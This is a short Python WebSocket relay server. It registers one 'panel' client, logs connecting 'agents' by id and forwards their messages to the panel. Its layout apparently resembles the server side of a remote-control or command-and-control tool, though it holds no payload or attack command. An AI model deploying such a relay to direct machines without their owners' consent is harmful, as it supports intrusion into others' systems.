import asyncio, json, websockets, os

PANEL = None
AGENTS = {}

async def handler(ws):
    global PANEL
    try:
        async for msg in ws:
            data = json.loads(msg)
            if data.get("cmd") == "register" and data.get("role") == "panel":
                PANEL = ws
                await ws.send(json.dumps({"type":"info","msg":"panel connected"}))
            elif data.get("id"):
                AGENTS[data["id"]] = ws
                print(f"[+] Agent Online: {data['id']}")
                if PANEL:
                    await PANEL.send(json.dumps({"type":"agent_online","id":data["id"]}))
            elif PANEL:
                await PANEL.send(msg)
    except websockets.exceptions.ConnectionClosed:
        pass

async def main():
    port = int(os.environ.get("PORT", 8443))
    print(f"Server jalan di port {port}")
    async with websockets.serve(handler, "0.0.0.0", port):
        await asyncio.Future()

asyncio.run(main())
